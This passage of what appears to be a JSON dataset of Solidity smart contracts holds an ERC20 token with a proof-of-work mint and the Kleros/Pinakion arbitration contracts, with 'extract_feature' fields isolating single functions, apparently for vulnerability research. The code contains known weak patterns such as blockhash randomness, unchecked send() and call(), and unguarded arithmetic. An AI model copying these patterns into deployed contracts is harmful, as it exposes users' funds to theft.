+= _value;\n emit Transfer(_from, _to, _value);\n assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\n }\n function transfer(address _to, uint256 _value) public returns (bool success) {\n _transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n require(_value <= allowance[_from][msg.sender]);\n allowance[_from][msg.sender] -= _value;\n _transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowance[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n tokenRecipient spender = tokenRecipient(_spender);\n if (approve(_spender, _value)) {\n spender.receiveApproval(msg.sender, _value, this, _extraData);\n return true;\n }\n }\n function burn(uint256 _value) public returns (bool success) {\n require(balanceOf[msg.sender] >= _value);\n balanceOf[msg.sender] -= _value;\n totalSupply -= _value;\n emit Burn(msg.sender, _value);\n return true;\n }\n function burnFrom(address _from, uint256 _value) public returns (bool success) {\n require(balanceOf[_from] >= _value);\n require(_value <= allowance[_from][msg.sender]);\n balanceOf[_from] -= _value;\n allowance[_from][msg.sender] -= _value;\n totalSupply -= _value;\n emit Burn(_from, _value);\n return true;\n }\n function () external {\n revert();\n }\n function giveBlockReward() public {\n balanceOf[block.coinbase] += 1;\n }\n function proofOfWork(uint256 nonce) public{\n bytes8 n = bytes8(keccak256(abi.encodePacked(nonce, currentChallenge)));\n require(n >= bytes8(difficulty));\n uint256 timeSinceLastProof = (now - timeOfLastProof);\n require(timeSinceLastProof >= 5 seconds);\n balanceOf[msg.sender] += timeSinceLastProof / 60 seconds;\n difficulty = difficulty * 10 minutes / timeSinceLastProof + 1;\n timeOfLastProof = now;\n currentChallenge = keccak256(abi.encodePacked(nonce, currentChallenge, blockhash(block.number - 1)));\n }\n}",
  "extract_feature": [
    "function proofOfWork(uint256 nonce) public{\nbytes8 n = bytes8(keccak256(abi.encodePacked(nonce, currentChallenge)));\nrequire(n >= bytes8(difficulty));\nuint256 timeSinceLastProof = (now - timeOfLastProof);\nrequire(timeSinceLastProof >= 5 seconds);\nbalanceOf[msg.sender] += timeSinceLastProof / 60 seconds;\ndifficulty = difficulty * 10 minutes / timeSinceLastProof + 1;\ntimeOfLastProof = now;\ncurrentChallenge = keccak256(abi.encodePacked(nonce, currentChallenge, blockhash(block.number - 1)));\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b43"
  },
  "filename": "2301.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ApproveAndCallFallBack {\n function receiveApproval(address from, uint256 _amount, address _token, bytes _data) public;\n}\ncontract TokenController {\n function proxyPayment(address _owner) public payable returns(bool);\n function onTransfer(address _from, address _to, uint _amount) public returns(bool);\n function onApprove(address _owner, address _spender, uint _amount) public\n returns(bool);\n}\ncontract Controlled {\n modifier onlyController { require(msg.sender == controller); _; }\n address public controller;\n function Controlled() public { controller = msg.sender;}\n function changeController(address _newController) public onlyController {\n controller = _newController;\n }\n}\ncontract Pinakion is Controlled {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'MMT_0.2';\n struct Checkpoint {\n uint128 fromBlock;\n uint128 value;\n }\n Pinakion public parentToken;\n uint public parentSnapShotBlock;\n uint public creationBlock;\n mapping (address => Checkpoint[]) balances;\n mapping (address => mapping (address => uint256)) allowed;\n Checkpoint[] totalSupplyHistory;\n bool public transfersEnabled;\n MiniMeTokenFactory public tokenFactory;\n function Pinakion(\n address _tokenFactory,\n address _parentToken,\n uint _parentSnapShotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public {\n tokenFactory = MiniMeTokenFactory(_tokenFactory);\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n parentToken = Pinakion(_parentToken);\n parentSnapShotBlock = _parentSnapShotBlock;\n transfersEnabled = _transfersEnabled;\n creationBlock = block.number;\n }\n function transfer(address _to, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n doTransfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount\n ) public returns (bool success) {\n if (msg.sender != controller) {\n require(transfersEnabled);\n require(allowed[_from][msg.sender] >= _amount);\n allowed[_from][msg.sender] -= _amount;\n }\n doTransfer(_from, _to, _amount);\n return true;\n }\n function doTransfer(address _from, address _to, uint _amount\n ) internal {\n if (_amount == 0) {\n Transfer(_from, _to, _amount);\n return;\n }\n require(parentSnapShotBlock < block.number);\n require((_to != 0) && (_to != address(this)));\n var previousBalanceFrom = balanceOfAt(_from, block.number);\n require(previousBalanceFrom >= _amount);\n if (isContract(controller)) {\n require(TokenController(controller).onTransfer(_from, _to, _amount));\n }\n updateValueAtNow(balances[_from], previousBalanceFrom - _amount);\n var previousBalanceTo = balanceOfAt(_to, block.number);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(balances[_to], previousBalanceTo + _amount);\n Transfer(_from, _to, _amount);\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balanceOfAt(_owner, block.number);\n }\n function approve(address _spender, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n if (isContract(controller)) {\n require(TokenController(controller).onApprove(msg.sender, _spender, _amount));\n }\n allowed[msg.sender][_spender] = _amount;\n Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender\n ) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _amount, bytes _extraData\n ) public returns (bool success) {\n require(approve(_spender, _amount));\n ApproveAndCallFallBack(_spender).receiveApproval(\n msg.sender,\n _amount,\n this,\n _extraData\n );\n return true;\n }\n function totalSupply() public constant returns (uint) {\n return totalSupplyAt(block.number);\n }\n function balanceOfAt(address _owner, uint _blockNumber) public constant\n returns (uint) {\n if ((balances[_owner].length == 0)\n || (balances[_owner][0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(balances[_owner], _blockNumber);\n }\n }\n function totalSupplyAt(uint _blockNumber) public constant returns(uint) {\n if ((totalSupplyHistory.length == 0)\n || (totalSupplyHistory[0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(totalSupplyHistory, _blockNumber);\n }\n }\n function createCloneToken(\n string _cloneTokenName,\n uint8 _cloneDecimalUnits,\n string _cloneTokenSymbol,\n uint _snapshotBlock,\n bool _transfersEnabled\n ) public returns(address) {\n if (_snapshotBlock == 0) _snapshotBlock = block.number;\n Pinakion cloneToken = tokenFactory.createCloneToken(\n this,\n _snapshotBlock,\n _cloneTokenName,\n _cloneDecimalUnits,\n _cloneTokenSymbol,\n _transfersEnabled\n );\n cloneToken.changeController(msg.sender);\n NewCloneToken(address(cloneToken), _snapshotBlock);\n return address(cloneToken);\n }\n function generateTokens(address _owner, uint _amount\n ) public onlyController returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply + _amount >= curTotalSupply);\n uint previousBalanceTo = balanceOf(_owner);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount);\n updateValueAtNow(balances[_owner], previousBalanceTo + _amount);\n Transfer(0, _owner, _amount);\n return true;\n }\n function destroyTokens(address _owner, uint _amount\n ) onlyController public returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply >= _amount);\n uint previousBalanceFrom = balanceOf(_owner);\n require(previousBalanceFrom >= _amount);\n updateValueAtNow(totalSupplyHistory, curTotalSupply - _amount);\n updateValueAtNow(balances[_owner], previousBalanceFrom - _amount);\n Transfer(_owner, 0, _amount);\n return true;\n }\n function enableTransfers(bool _transfersEnabled) public onlyController {\n transfersEnabled = _transfersEnabled;\n }\n function getValueAt(Checkpoint[] storage checkpoints, uint _block\n ) constant internal returns (uint) {\n if (checkpoints.length == 0) return 0;\n if (_block >= checkpoints[checkpoints.length-1].fromBlock)\n return checkpoints[checkpoints.length-1].value;\n if (_block < checkpoints[0].fromBlock) return 0;\n uint min = 0;\n uint max = checkpoints.length-1;\n while (max > min) {\n uint mid = (max + min + 1)/ 2;\n if (checkpoints[mid].fromBlock<=_block) {\n min = mid;\n } else {\n max = mid-1;\n }\n }\n return checkpoints[min].value;\n }\n function updateValueAtNow(Checkpoint[] storage checkpoints, uint _value\n ) internal {\n if ((checkpoints.length == 0)\n || (checkpoints[checkpoints.length -1].fromBlock < block.number)) {\n Checkpoint storage newCheckPoint = checkpoints[ checkpoints.length++ ];\n newCheckPoint.fromBlock = uint128(block.number);\n newCheckPoint.value = uint128(_value);\n } else {\n Checkpoint storage oldCheckPoint = checkpoints[checkpoints.length-1];\n oldCheckPoint.value = uint128(_value);\n }\n }\n function isContract(address _addr) constant internal returns(bool) {\n uint size;\n if (_addr == 0) return false;\n assembly {\n size := extcodesize(_addr)\n }\n return size>0;\n }\n function min(uint a, uint b) pure internal returns (uint) {\n return a < b ? a : b;\n }\n function () public payable {\n require(isContract(controller));\n require(TokenController(controller).proxyPayment.value(msg.value)(msg.sender));\n }\n function claimTokens(address _token) public onlyController {\n if (_token == 0x0) {\n controller.transfer(this.balance);\n return;\n }\n Pinakion token = Pinakion(_token);\n uint balance = token.balanceOf(this);\n token.transfer(controller, balance);\n ClaimedTokens(_token, controller, balance);\n }\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock);\n event Approval(\n address indexed _owner,\n address indexed _spender,\n uint256 _amount\n );\n}\ncontract MiniMeTokenFactory {\n function createCloneToken(\n address _parentToken,\n uint _snapshotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public returns (Pinakion) {\n Pinakion newToken = new Pinakion(\n this,\n _parentToken,\n _snapshotBlock,\n _tokenName,\n _decimalUnits,\n _tokenSymbol,\n _transfersEnabled\n );\n newToken.changeController(msg.sender);\n return newToken;\n }\n}\ncontract RNG{\n function contribute(uint _block) public payable;\n function requestRN(uint _block) public payable {\n contribute(_block);\n }\n function getRN(uint _block) public returns (uint RN);\n function getUncorrelatedRN(uint _block) public returns (uint RN) {\n uint baseRN=getRN(_block);\n if (baseRN==0)\n return 0;\n else\n return uint(keccak256(msg.sender,baseRN));\n }\n }\ncontract BlockHashRNG is RNG {\n mapping (uint => uint) public randomNumber;\n mapping (uint => uint) public reward;\n function contribute(uint _block) public payable { reward[_block]+=msg.value; }\n function getRN(uint _block) public returns (uint RN) {\n RN=randomNumber[_block];\n if (RN==0){\n saveRN(_block);\n return randomNumber[_block];\n }\n else\n return RN;\n }\n function saveRN(uint _block) public {\n if (blockhash(_block) != 0x0)\n randomNumber[_block] = uint(blockhash(_block));\n if (randomNumber[_block] != 0) {\n uint rewardToSend = reward[_block];\n reward[_block] = 0;\n msg.sender.send(rewardToSend);\n }\n }\n}\ncontract BlockHashRNGFallback is BlockHashRNG {\n function saveRN(uint _block) public {\n if (_block<block.number && randomNumber[_block]==0) {\n if (blockhash(_block)!=0x0)\n randomNumber[_block]=uint(blockhash(_block));\n else\n randomNumber[_block]=uint(blockhash(block.number-1));\n }\n if (randomNumber[_block] != 0) {\n uint rewardToSend=reward[_block];\n reward[_block]=0;\n msg.sender.send(rewardToSend);\n }\n }\n}\ncontract Arbitrable{\n Arbitrator public arbitrator;\n bytes public arbitratorExtraData;\n modifier onlyArbitrator {require(msg.sender==address(arbitrator)); _;}\n event Ruling(Arbitrator indexed _arbitrator, uint indexed _disputeID, uint _ruling);\n event MetaEvidence(uint indexed _metaEvidenceID, string _evidence);\n event Dispute(Arbitrator indexed _arbitrator, uint indexed _disputeID, uint _metaEvidenceID);\n event Evidence(Arbitrator indexed _arbitrator, uint indexed _disputeID, address _party, string _evidence);\n constructor(Arbitrator _arbitrator, bytes _arbitratorExtraData) public {\n arbitrator = _arbitrator;\n arbitratorExtraData = _arbitratorExtraData;\n }\n function rule(uint _disputeID, uint _ruling) public onlyArbitrator {\n emit Ruling(Arbitrator(msg.sender),_disputeID,_ruling);\n executeRuling(_disputeID,_ruling);\n }\n function executeRuling(uint _disputeID, uint _ruling) internal;\n}\ncontract Arbitrator{\n enum DisputeStatus {Waiting, Appealable, Solved}\n modifier requireArbitrationFee(bytes _extraData) {require(msg.value>=arbitrationCost(_extraData)); _;}\n modifier requireAppealFee(uint _disputeID, bytes _extraData) {require(msg.value>=appealCost(_disputeID, _extraData)); _;}\n event AppealPossible(uint _disputeID);\n event DisputeCreation(uint indexed _disputeID, Arbitrable _arbitrable);\n event AppealDecision(uint indexed _disputeID, Arbitrable _arbitrable);\n function createDispute(uint _choices, bytes _extraData) public requireArbitrationFee(_extraData) payable returns(uint disputeID) {}\n function arbitrationCost(bytes _extraData) public constant returns(uint fee);\n function appeal(uint _disputeID, bytes _extraData) public requireAppealFee(_disputeID,_extraData) payable {\n emit AppealDecision(_disputeID, Arbitrable(msg.sender));\n }\n function appealCost(uint _disputeID, bytes _extraData) public constant returns(uint fee);\n function disputeStatus(uint _disputeID) public constant returns(DisputeStatus status);\n function currentRuling(uint _disputeID) public constant returns(uint ruling);\n}\ncontract Kleros is Arbitrator, ApproveAndCallFallBack {\n Pinakion public pinakion;\n uint public constant NON_PAYABLE_AMOUNT = (2**256 - 2) / 2;\n RNG public rng;\n uint public arbitrationFeePerJuror = 0.05 ether;\n uint16 public defaultNumberJuror = 3;\n uint public minActivatedToken = 0.1 * 1e18;\n uint[5] public timePerPeriod;\n uint public alpha = 2000;\n uint constant ALPHA_DIVISOR = 1e4;\n uint public maxAppeals = 5;\n address public governor;\n uint public session = 1;\n uint public lastPeriodChange;\n uint public segmentSize;\n uint public rnBlock;\n uint public randomNumber;\n enum Period {\n Activation,\n Draw,\n Vote,\n Appeal,\n Execution\n }\n Period public period;\n struct Juror {\n uint balance;\n uint atStake;\n uint lastSession;\n uint segmentStart;\n uint segmentEnd;\n }\n mapping (address => Juror) public jurors;\n struct Vote {\n address account;\n uint ruling;\n }\n struct VoteCounter {\n uint winningChoice;\n uint winningCount;\n mapping (uint => uint) voteCount;\n }\n enum DisputeState {\n Open,\n Resolving,\n Executable,\n Executed\n }\n struct Dispute {\n Arbitrable arbitrated;\n uint session;\n uint appeals;\n uint choices;\n uint16 initialNumberJurors;\n uint arbitrationFeePerJuror;\n DisputeState state;\n Vote[][] votes;\n VoteCounter[] voteCounter;\n mapping (address => uint) lastSessionVote;\n uint currentAppealToRepartition;\n AppealsRepartitioned[] appealsRepartitioned;\n }\n enum RepartitionStage {\n Incoherent,\n Coherent,\n AtStake,\n Complete\n }\n struct AppealsRepartitioned {\n uint totalToRedistribute;\n uint nbCoherent;\n uint currentIncoherentVote;\n uint currentCoherentVote;\n uint currentAtStakeVote;\n RepartitionStage stage;\n }\n Dispute[] public disputes;\n event NewPeriod(Period _period, uint indexed _session);\n event TokenShift(address indexed _account, uint _disputeID, int _amount);\n event ArbitrationReward(address indexed _account, uint _disputeID, uint _amount);\n modifier onlyBy(address _account) {require(msg.sender == _account); _;}\n modifier onlyDuring(Period _period) {require(period == _period); _;}\n modifier onlyGovernor() {require(msg.sender == governor); _;}\n constructor(Pinakion _pinakion, RNG _rng, uint[5] _timePerPeriod, address _governor) public {\n pinakion = _pinakion;\n rng = _rng;\n lastPeriodChange = now;\n timePerPeriod = _timePerPeriod;\n governor = _governor;\n }\n function receiveApproval(address _from, uint _amount, address, bytes) public onlyBy(pinakion) {\n require(pinakion.transferFrom(_from, this, _amount));\n jurors[_from].balance += _amount;\n }\n function withdraw(uint _value) public {\n Juror storage juror = jurors[msg.sender];\n require(juror.atStake <= juror.balance);\n require(_value <= juror.balance-juror.atStake);\n require(juror.lastSession != session);\n juror.balance -= _value;\n require(pinakion.transfer(msg.sender,_value));\n }\n function passPeriod() public {\n require(now-lastPeriodChange >= timePerPeriod[uint8(period)]);\n if (period == Period.Activation) {\n rnBlock = block.number + 1;\n rng.requestRN(rnBlock);\n period = Period.Draw;\n } else if (period == Period.Draw) {\n randomNumber = rng.getUncorrelatedRN(rnBlock);\n require(randomNumber != 0);\n period = Period.Vote;\n } else if (period == Period.Vote) {\n period = Period.Appeal;\n } else if (period == Period.Appeal) {\n period = Period.Execution;\n } else if (period == Period.Execution) {\n period = Period.Activation;\n ++session;\n segmentSize = 0;\n rnBlock = 0;\n randomNumber = 0;\n }\n lastPeriodChange = now;\n NewPeriod(period, session);\n }\n function activateTokens(uint _value) public onlyDuring(Period.Activation) {\n Juror storage juror = jurors[msg.sender];\n require(_value <= juror.balance);\n require(_value >= minActivatedToken);\n require(juror.lastSession != session);\n juror.lastSession = session;\n juror.segmentStart = segmentSize;\n segmentSize += _value;\n juror.segmentEnd = segmentSize;\n }\n function voteRuling(uint _disputeID, uint _ruling, uint[] _draws) public onlyDuring(Period.Vote) {\n Dispute storage dispute = disputes[_disputeID];\n Juror storage juror = jurors[msg.sender];\n VoteCounter storage voteCounter = dispute.voteCounter[dispute.appeals];\n require(dispute.lastSessionVote[msg.sender] != session);\n require(_ruling <= dispute.choices);\n require(validDraws(msg.sender, _disputeID, _draws));\n dispute.lastSessionVote[msg.sender] = session;\n voteCounter.voteCount[_ruling] += _draws.length;\n if (voteCounter.winningCount < voteCounter.voteCount[_ruling]) {\n voteCounter.winningCount = voteCounter.voteCount[_ruling];\n voteCounter.winningChoice = _ruling;\n } else if (voteCounter.winningCount==voteCounter.voteCount[_ruling] && _draws.length!=0) {\n voteCounter.winningChoice = 0;\n }\n for (uint i = 0; i < _draws.length; ++i) {\n dispute.votes[dispute.appeals].push(Vote({\n account: msg.sender,\n ruling: _ruling\n }));\n }\n juror.atStake += _draws.length * getStakePerDraw();\n uint feeToPay = _draws.length * dispute.arbitrationFeePerJuror;\n msg.sender.transfer(feeToPay);\n ArbitrationReward(msg.sender, _disputeID, feeToPay);\n }\n function penalizeInactiveJuror(address _jurorAddress, uint _disputeID, uint[] _draws) public {\n Dispute storage dispute = disputes[_disputeID];\n Juror storage inactiveJuror = jurors[_jurorAddress];\n require(period > Period.Vote);\n require(dispute.lastSessionVote[_jurorAddress] != session);\n dispute.lastSessionVote[_jurorAddress] = session;\n require(validDraws(_jurorAddress, _disputeID, _draws));\n uint penality = _draws.length * minActivatedToken * 2 * alpha / ALPHA_DIVISOR;\n penality = (penality < inactiveJuror.balance) ? penality : inactiveJuror.balance;\n inactiveJuror.balance -= penality;\n TokenShift(_jurorAddress, _disputeID, -int(penality));\n jurors[msg.sender].balance += penality / 2;\n TokenShift(msg.sender, _disputeID, int(penality / 2));\n jurors[governor].balance += penality / 2;\n TokenShift(governor, _disputeID, int(penality / 2));\n msg.sender.transfer(_draws.length*dispute.arbitrationFeePerJuror);\n }\n function oneShotTokenRepartition(uint _disputeID) public onlyDuring(Period.Execution) {\n Dispute storage dispute = disputes[_disputeID];\n require(dispute.state == DisputeState.Open);\n require(dispute.session+dispute.appeals <= session);\n uint winningChoice = dispute.voteCounter[dispute.appeals].winningChoice;\n uint amountShift = getStakePerDraw();\n for (uint i = 0; i <= dispute.appeals; ++i) {\n if (winningChoice!=0 || (dispute.voteCounter[dispute.appeals].voteCount[0] == dispute.voteCounter[dispute.appeals].winningCount)) {\n uint totalToRedistribute = 0;\n uint nbCoherent = 0;\n for (uint j = 0; j < dispute.votes[i].length; ++j) {\n Vote storage vote = dispute.votes[i][j];\n if (vote.ruling != winningChoice) {\n Juror storage juror = jurors[vote.account];\n uint penalty = amountShift<juror.balance ? amountShift : juror.balance;\n juror.balance -= penalty;\n TokenShift(vote.account, _disputeID, int(-penalty));\n totalToRedistribute += penalty;\n } else {\n ++nbCoherent;\n }\n }\n if (nbCoherent == 0) {\n jurors[governor].balance += totalToRedistribute;\n TokenShift(governor, _disputeID, int(totalToRedistribute));\n } else {\n uint toRedistribute = totalToRedistribute / nbCoherent;\n for (j = 0; j < dispute.votes[i].length; ++j) {\n vote = dispute.votes[i][j];\n if (vote.ruling == winningChoice) {\n juror = jurors[vote.account];\n juror.balance += toRedistribute;\n TokenShift(vote.account, _disputeID, int(toRedistribute));\n }\n }\n }\n }\n for (j = 0; j < dispute.votes[i].length; ++j) {\n vote = dispute.votes[i][j];\n juror = jurors[vote.account];\n juror.atStake -= amountShift;\n }\n }\n dispute.state = DisputeState.Executable;\n }\n function multipleShotTokenRepartition(uint _disputeID, uint _maxIterations) public onlyDuring(Period.Execution) {\n Dispute storage dispute = disputes[_disputeID];\n require(dispute.state <= DisputeState.Resolving);\n require(dispute.session+dispute.appeals <= session);\n dispute.state = DisputeState.Resolving;\n uint winningChoice = dispute.voteCounter[dispute.appeals].winningChoice;\n uint amountShift = getStakePerDraw();\n uint currentIterations = 0;\n for (uint i = dispute.currentAppealToRepartition; i <= dispute.appeals; ++i) {\n if (dispute.appealsRepartitioned.length < i+1) {\n dispute.appealsRepartitioned.length++;\n }\n if (winningChoice==0 && (dispute.voteCounter[dispute.appeals].voteCount[0] != dispute.voteCounter[dispute.appeals].winningCount)) {\n dispute.appealsRepartitioned[i].stage = RepartitionStage.AtStake;\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.Incoherent) {\n for (uint j = dispute.appealsRepartitioned[i].currentIncoherentVote; j < dispute.votes[i].length; ++j) {\n if (currentIterations >= _maxIterations) {\n return;\n }\n Vote storage vote = dispute.votes[i][j];\n if (vote.ruling != winningChoice) {\n Juror storage juror = jurors[vote.account];\n uint penalty = amountShift<juror.balance ? amountShift : juror.balance;\n juror.balance -= penalty;\n TokenShift(vote.account, _disputeID, int(-penalty));\n dispute.appealsRepartitioned[i].totalToRedistribute += penalty;\n } else {\n ++dispute.appealsRepartitioned[i].nbCoherent;\n }\n ++dispute.appealsRepartitioned[i].currentIncoherentVote;\n ++currentIterations;\n }\n dispute.appealsRepartitioned[i].stage = RepartitionStage.Coherent;\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.Coherent) {\n if (dispute.appealsRepartitioned[i].nbCoherent == 0) {\n jurors[governor].balance += dispute.appealsRepartitioned[i].totalToRedistribute;\n TokenShift(governor, _disputeID, int(dispute.appealsRepartitioned[i].totalToRedistribute));\n dispute.appealsRepartitioned[i].stage = RepartitionStage.AtStake;\n } else {\n uint toRedistribute = dispute.appealsRepartitioned[i].totalToRedistribute / dispute.appealsRepartitioned[i].nbCoherent;\n for (j = dispute.appealsRepartitioned[i].currentCoherentVote; j < dispute.votes[i].length; ++j) {\n if (currentIterations >= _maxIterations) {\n return;\n }\n vote = dispute.votes[i][j];\n if (vote.ruling == winningChoice) {\n juror = jurors[vote.account];\n juror.balance += toRedistribute;\n TokenShift(vote.account, _disputeID, int(toRedistribute));\n }\n ++currentIterations;\n ++dispute.appealsRepartitioned[i].currentCoherentVote;\n }\n dispute.appealsRepartitioned[i].stage = RepartitionStage.AtStake;\n }\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.AtStake) {\n for (j = dispute.appealsRepartitioned[i].currentAtStakeVote; j < dispute.votes[i].length; ++j) {\n if (currentIterations >= _maxIterations) {\n return;\n }\n vote = dispute.votes[i][j];\n juror = jurors[vote.account];\n juror.atStake -= amountShift;\n ++currentIterations;\n ++dispute.appealsRepartitioned[i].currentAtStakeVote;\n }\n dispute.appealsRepartitioned[i].stage = RepartitionStage.Complete;\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.Complete) {\n ++dispute.currentAppealToRepartition;\n }\n }\n dispute.state = DisputeState.Executable;\n }\n function amountJurors(uint _disputeID) public view returns (uint nbJurors) {\n Dispute storage dispute = disputes[_disputeID];\n return (dispute.initialNumberJurors + 1) * 2**dispute.appeals - 1;\n }\n function validDraws(address _jurorAddress, uint _disputeID, uint[] _draws) public view returns (bool valid) {\n uint draw = 0;\n Juror storage juror = jurors[_jurorAddress];\n Dispute storage dispute = disputes[_disputeID];\n uint nbJurors = amountJurors(_disputeID);\n if (juror.lastSession != session) return false;\n if (dispute.session+dispute.appeals != session) return false;\n if (period <= Period.Draw) return false;\n for (uint i = 0; i < _draws.length; ++i) {\n if (_draws[i] <= draw) return false;\n draw = _draws[i];\n if (draw > nbJurors) return false;\n uint position = uint(keccak256(randomNumber, _disputeID, draw)) % segmentSize;\n require(position >= juror.segmentStart);\n require(position < juror.segmentEnd);\n }\n return true;\n }\n function createDispute(uint _choices, bytes _extraData) public payable returns (uint disputeID) {\n uint16 nbJurors = extraDataToNbJurors(_extraData);\n require(msg.value >= arbitrationCost(_extraData));\n disputeID = disputes.length++;\n Dispute storage dispute = disputes[disputeID];\n dispute.arbitrated = Arbitrable(msg.sender);\n if (period < Period.Draw)\n dispute.session = session;\n else\n dispute.session = session+1;\n dispute.choices = _choices;\n dispute.initialNumberJurors = nbJurors;\n dispute.arbitrationFeePerJuror = arbitrationFeePerJuror;\n dispute.votes.length++;\n dispute.voteCounter.length++;\n DisputeCreation(disputeID, Arbitrable(msg.sender));\n return disputeID;\n }\n function appeal(uint _disputeID, bytes _extraData) public payable onlyDuring(Period.Appeal) {\n super.appeal(_disputeID,_extraData);\n Dispute storage dispute = disputes[_disputeID];\n require(msg.value >= appealCost(_disputeID, _extraData));\n require(dispute.session+dispute.appeals == session);\n require(dispute.arbitrated == msg.sender);\n dispute.appeals++;\n dispute.votes.length++;\n dispute.voteCounter.length++;\n }\n function executeRuling(uint disputeID) public {\n Dispute storage dispute = disputes[disputeID];\n require(dispute.state == DisputeState.Executable);\n dispute.state = DisputeState.Executed;\n dispute.arbitrated.rule(disputeID, dispute.voteCounter[dispute.appeals].winningChoice);\n }\n function arbitrationCost(bytes _extraData) public view returns (uint fee) {\n return extraDataToNbJurors(_extraData) * arbitrationFeePerJuror;\n }\n function appealCost(uint _disputeID, bytes _extraData) public view returns (uint fee) {\n Dispute storage dispute = disputes[_disputeID];\n if(dispute.appeals >= maxAppeals) return NON_PAYABLE_AMOUNT;\n return (2*amountJurors(_disputeID) + 1) * dispute.arbitrationFeePerJuror;\n }\n function extraDataToNbJurors(bytes _extraData) internal view returns (uint16 nbJurors) {\n if (_extraData.length < 2)\n return defaultNumberJuror;\n else\n return (uint16(_extraData[0]) << 8) + uint16(_extraData[1]);\n }\n function getStakePerDraw() public view returns (uint minActivatedTokenInAlpha) {\n return (alpha * minActivatedToken) / ALPHA_DIVISOR;\n }\n function getVoteAccount(uint _disputeID, uint _appeals, uint _voteID) public view returns (address account) {\n return disputes[_disputeID].votes[_appeals][_voteID].account;\n }\n function getVoteRuling(uint _disputeID, uint _appeals, uint _voteID) public view returns (uint ruling) {\n return disputes[_disputeID].votes[_appeals][_voteID].ruling;\n }\n function getWinningChoice(uint _disputeID, uint _appeals) public view returns (uint winningChoice) {\n return disputes[_disputeID].voteCounter[_appeals].winningChoice;\n }\n function getWinningCount(uint _disputeID, uint _appeals) public view returns (uint winningCount) {\n return disputes[_disputeID].voteCounter[_appeals].winningCount;\n }\n function getVoteCount(uint _disputeID, uint _appeals, uint _choice) public view returns (uint voteCount) {\n return disputes[_disputeID].voteCounter[_appeals].voteCount[_choice];\n }\n function getLastSessionVote(uint _disputeID, address _juror) public view returns (uint lastSessionVote) {\n return disputes[_disputeID].lastSessionVote[_juror];\n }\n function isDrawn(uint _disputeID, address _juror, uint _draw) public view returns (bool drawn) {\n Dispute storage dispute = disputes[_disputeID];\n Juror storage juror = jurors[_juror];\n if (juror.lastSession != session\n || (dispute.session+dispute.appeals != session)\n || period<=Period.Draw\n || _draw>amountJurors(_disputeID)\n || _draw==0\n || segmentSize==0\n ) {\n return false;\n } else {\n uint position = uint(keccak256(randomNumber,_disputeID,_draw)) % segmentSize;\n return (position >= juror.segmentStart) && (position < juror.segmentEnd);\n }\n }\n function currentRuling(uint _disputeID) public view returns (uint ruling) {\n Dispute storage dispute = disputes[_disputeID];\n return dispute.voteCounter[dispute.appeals].winningChoice;\n }\n function disputeStatus(uint _disputeID) public view returns (DisputeStatus status) {\n Dispute storage dispute = disputes[_disputeID];\n if (dispute.session+dispute.appeals < session)\n return DisputeStatus.Solved;\n else if(dispute.session+dispute.appeals == session) {\n if (dispute.state == DisputeState.Open) {\n if (period < Period.Appeal)\n return DisputeStatus.Waiting;\n else if (period == Period.Appeal)\n return DisputeStatus.Appealable;\n else return DisputeStatus.Solved;\n } else return DisputeStatus.Solved;\n } else return DisputeStatus.Waiting;\n }\n function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {\n _target.call.value(_value)(_data);\n }\n function setRng(RNG _rng) public onlyGovernor {\n rng = _rng;\n }\n function setArbitrationFeePerJuror(uint _arbitrationFeePerJuror) public onlyGovernor {\n arbitrationFeePerJuror = _arbitrationFeePerJuror;\n }\n function setDefaultNumberJuror(uint16 _defaultNumberJuror) public onlyGovernor {\n defaultNumberJuror = _defaultNumberJuror;\n }\n function setMinActivatedToken(uint _minActivatedToken) public onlyGovernor {\n minActivatedToken = _minActivatedToken;\n }\n function setTimePerPeriod(uint[5] _timePerPeriod) public onlyGovernor {\n timePerPeriod = _timePerPeriod;\n }\n function setAlpha(uint _alpha) public onlyGovernor {\n alpha = _alpha;\n }\n function setMaxAppeals(uint _maxAppeals) public onlyGovernor {\n maxAppeals = _maxAppeals;\n }\n function setGovernor(address _governor) public onlyGovernor {\n governor = _governor;\n }\n}",
  "extract_feature": [
    "function balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balanceOfAt(_owner, block.number);\n}",
